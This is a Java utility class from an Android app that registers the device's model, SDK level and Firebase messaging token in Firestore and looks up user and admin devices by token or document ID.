package com.lyrnic.userside.utilities;

import android.content.Context;
import android.os.Build;
import android.util.ArrayMap;
import android.util.Log;

import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FieldPath;
import com.google.firebase.firestore.FirebaseFirestore;
import com.lyrnic.userside.constants.Constants;
import com.lyrnic.userside.firebase.FirebaseActionsReceiver;
import com.lyrnic.userside.listeners.DeviceExistenceListener;
import com.lyrnic.userside.listeners.DeviceTokenReceiver;
import com.lyrnic.userside.listeners.DevicesReceiverListener;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Map;
import java.util.Objects;

public class DevicesUtilities {
    public static void registerDeviceToken(Context context) {

        checkDeviceExistence(context, (found) -> {
            if (!found) {
                saveDevice(context, createDevice(context));
            }
        });
    }

    public static ArrayMap<String, String> createDevice(Context context) {
        ArrayMap<String, String> device = new ArrayMap<String, String>();

        device.put(Constants.DEVICE_NAME_KEY, Build.MANUFACTURER + " " + Build.MODEL);
        device.put(Constants.DEVICES_ADMIN_KEY,"false");
        device.put(Constants.DEVICE_ADD_DATE_KEY, new SimpleDateFormat("yyyy/MM/dd HH:mm:ss").format(new Date(System.currentTimeMillis())));
        device.put(Constants.DEVICE_TOKEN_KEY, FirebaseActionsReceiver.getToken(context));
        device.put(Constants.DEVICES_API_KEY,String.valueOf(Build.VERSION.SDK_INT));

        return device;
    }
    public static void getUsersDevices(Context context, DevicesReceiverListener devicesReceiverListener){
        FirebaseFirestore db = FirebaseFirestore.getInstance();

        db.collection(Constants.DEVICES_COLLECTION_NAME).
                whereEqualTo(Constants.DEVICES_ADMIN_KEY,"false").get().addOnCompleteListener((task -> {
                    if(task.isSuccessful()){
                        Map<String,Map<String,Object>> devices = new ArrayMap<>();
                        for(DocumentSnapshot documentSnapshot : task.getResult().getDocuments()){
                            devices.put(documentSnapshot.getId(),documentSnapshot.getData());
                        }
                        devicesReceiverListener.onReceive(devices);
                    }
                }));
    }
    public static void getUserDeviceTokenById(Context context, String id, DeviceTokenReceiver deviceTokenReceiver){
        FirebaseFirestore db = FirebaseFirestore.getInstance();

        db.collection(Constants.DEVICES_COLLECTION_NAME)
                .whereEqualTo(FieldPath.documentId(),id).get().addOnCompleteListener((task -> {
                    if(task.isSuccessful()){
                        DocumentSnapshot documentSnapshot = task.getResult().getDocuments().get(0);
                        deviceTokenReceiver.onReceive(documentSnapshot.get(Constants.DEVICE_TOKEN_KEY,String.class));
                    }
                }));
    }
    public static void isAdminDeviceExist(Context context, String token, DeviceExistenceListener deviceExistenceListener) {
        if (token == null || token.isEmpty()) {
            return;
        }
        FirebaseFirestore db = FirebaseFirestore.getInstance();

        db.collection(Constants.DEVICES_COLLECTION_NAME)
                .whereEqualTo(Constants.DEVICE_TOKEN_KEY, token)
                .whereEqualTo(Constants.DEVICES_ADMIN_KEY,"true")
                .get().addOnCompleteListener((task) -> {
                    if (task.isSuccessful()) {
                        if (task.getResult().size() > 0) {
                            deviceExistenceListener.onResult(true);
                        }
                    } else {
                        deviceExistenceListener.onResult(false);
                    }
                });
    }
    public static void isDeviceExist(Context context, String token, DeviceExistenceListener deviceExistenceListener){
        if(token == null || token.isEmpty()){
            return;
        }
        FirebaseFirestore db = FirebaseFirestore.getInstance();

        db.collection(Constants.DEVICES_COLLECTION_NAME)
                .whereEqualTo(Constants.DEVICE_TOKEN_KEY,token).get().addOnCompleteListener((task) -> {
                    if (task.isSuccessful()) {
                        if(task.getResult().size() > 0){
                            deviceExistenceListener.onResult(true);
                        }
                        else{
                            deviceExistenceListener.onResult(false);
                        }
                    }
                    else{
                        deviceExistenceListener.onResult(false);
                    }
                });
    }

    public static void checkDeviceExistence(Context context, DeviceExistenceListener deviceExistenceListener) {
        if(getDeviceDocumentId(context) == null){
            deviceExistenceListener.onResult(false);
            return;
        }

        FirebaseFirestore db = FirebaseFirestore.getInstance();

        db.collection(Constants.DEVICES_COLLECTION_NAME)
                .whereEqualTo(FieldPath.documentId(),getDeviceDocumentId(context)).get().addOnCompleteListener((task) -> {
                    if (task.isSuccessful()) {
                        deviceExistenceListener.onResult(task.getResult().size() > 0);
                    }
                    else{
                        deviceExistenceListener.onResult(false);
                    }
                });

    }
    public static void updateDeviceToken(Context context) {
        FirebaseFirestore db = FirebaseFirestore.getInstance();
        db.collection(Constants.DEVICES_COLLECTION_NAME)
                .document(getDeviceDocumentId(context))
                .update(Constants.DEVICE_TOKEN_KEY,FirebaseActionsReceiver.getToken(context));
    }

    public static void saveDevice(Context context, Map<String, String> device) {
        FirebaseFirestore db = FirebaseFirestore.getInstance();
        db.collection(Constants.DEVICES_COLLECTION_NAME)
                .add(device)
                .addOnSuccessListener((documentReference -> {
                            Log.d(context.getPackageName() + "::Firestore", "DocumentSnapshot added with ID: " + documentReference.getId());
                            saveDeviceDocumentId(context, documentReference.getId());
                        })
                ).addOnFailureListener((e) -> {
                    Log.w(context.getPackageName() + "::Firestore", "Error adding document", e);
                });
    }

    public static void saveDeviceDocumentId(Context context, String path) {
        context.getSharedPreferences(Constants.FCM_PREFERENCES_KEY, Context.MODE_PRIVATE).edit()
                .putString(Constants.DEVICE_DOCUMENT_ID_KEY, path).apply();
        Log.d(context.getPackageName() + "::Firestore", path + " saved");
    }

    public static String getDeviceDocumentId(Context context) {
        return context.getSharedPreferences(Constants.FCM_PREFERENCES_KEY, Context.MODE_PRIVATE)
                .getString(Constants.DEVICE_DOCUMENT_ID_KEY, null);
    }
}
